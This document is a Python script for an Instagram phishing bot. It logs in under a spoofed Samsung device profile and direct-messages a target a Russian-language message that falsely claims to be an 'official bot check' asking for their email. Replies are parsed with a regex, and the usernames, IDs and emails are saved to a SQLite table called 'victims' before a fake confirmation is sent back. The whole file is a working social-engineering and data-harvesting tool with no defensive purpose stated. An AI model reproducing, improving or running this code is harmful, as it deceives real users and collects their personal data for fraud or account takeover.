from instagrapi import Client
import os, threading, time, sqlite3, datetime, re

USERNAME = os.environ.get("IG_USER")
PASSWORD = os.environ.get("IG_PASS")
TARGET   = os.environ.get("IG_TARGET")

FIRST_MSG = (
    "Здравствуйте! Это официальная проверка пользователей на наличие ботов. "
    "Для подтверждения вашего аккаунта укажите основной email прямо в этом чате — "
    "мы отправим на него код подтверждения.\n\n"
    "Пример: your_email@gmail.com\n\n"
    "Ответьте, пожалуйста, одним сообщением с вашим email."
)

WAIT_MSG = (
    "Спасибо! Ваш email принят. "
    "Ожидайте письмо с кодом подтверждения в течение 10 часов."
)

DB = "victims.db"

def init_db():
    db = sqlite3.connect(DB)
    db.execute("""CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT, user_id TEXT, email TEXT, ts TEXT)""")
    db.commit()
    db.close()

def run_bot():
    if not USERNAME or not PASSWORD:
        print("[-] FATAL: IG_USER или IG_PASS не заданы")
        return

    cl = Client()
    
    # ПРИНУДИТЕЛЬНО ставим свежий user-agent ПЕРЕД логином
    cl.set_user_agent(
        "Instagram 460.0.0.30.94 Android (34/14.0; 420dpi; 1080x2400; "
        "samsung; SM-G991B; o1s; exynos2100; en_US; 372382791)"
    )
    cl.set_device({
        "app_version": "460.0.0.30.94",
        "android_version": 34,
        "android_release": "14.0",
        "dpi": "420dpi",
        "resolution": "1080x2400",
        "manufacturer": "samsung",
        "device": "o1s",
        "model": "SM-G991B",
        "cpu": "exynos2100",
        "version_code": "372382791",
    })

    try:
        cl.login(USERNAME, PASSWORD)
        cl.dump_settings("session.json")
        print("[+] Логин ок")
    except Exception as e:
        print("[-] login error:", repr(e))
        return

    try:
        user_id = cl.user_id_from_username(TARGET)
        cl.direct_send(FIRST_MSG, [user_id])
        print(f"[+] Отправлено {TARGET}")
    except Exception as e:
        print("[-] send error:", repr(e))

    EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
    seen, replied = set(), set()

    while True:
        try:
            for t in cl.direct_threads(amount=20):
                for msg in t.messages:
                    key = (t.id, msg.id)
                    if key in seen or msg.user_id == cl.user_id:
                        continue
                    seen.add(key)
                    text = msg.text or ""
                    m = EMAIL_RE.search(text)
                    if not m:
                        continue
                    email = m.group(0)
                    username = t.users[0].username if t.users else "?"
                    uid = str(msg.user_id)
                    db = sqlite3.connect(DB)
                    db.execute(
                        "INSERT INTO victims (username,user_id,email,ts) VALUES (?,?,?,?)",
                        (username, uid, email, datetime.datetime.now().isoformat()))
                    db.commit()
                    db.close()
                    print(f"[+] {username}: {email}")
                    if uid not in replied:
                        replied.add(uid)
                        try:
                            cl.direct_send(WAIT_MSG, [int(uid)])
                            print(f"[+] Подтверждение отправлено {username}")
                        except Exception as e:
                            print("[-] reply error:", repr(e))
        except Exception as e:
            print("[-] loop error:", repr(e))
        time.sleep(15)

def start_bot_thread():
    init_db()
    threading.Thread(target=run_bot, daemon=True).start()
